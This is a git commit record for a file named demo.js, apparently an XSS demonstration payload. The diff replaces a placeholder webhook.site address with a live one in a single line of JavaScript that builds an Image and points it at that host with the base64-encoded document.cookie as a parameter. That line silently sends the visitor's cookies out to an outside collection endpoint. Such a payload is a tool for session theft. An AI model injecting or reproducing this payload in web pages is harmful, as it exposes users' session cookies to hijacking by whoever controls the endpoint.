9e16a7672d64618f229407935926f7f9c6678442
nguyenngoctiendev <123345255+nguyenngoctiendev@users.noreply.github.com>
2024-05-09 09:36:09 +0700

    Update demo.js

--- demo.js
+++ demo.js
@@ -1,2 +1,1 @@
-var  x = new Image(); x.src = 'https://webhook.site/xxxxxxx-xxxx-xxxx-xxxx-xxxxxxx?
-  data='+btoa(document.cookie);
+var  x = new Image(); x.src = 'https://webhook.site/036d6e79-43e6-4741-a5dd-72f470b37875?data='+btoa(document.cookie);
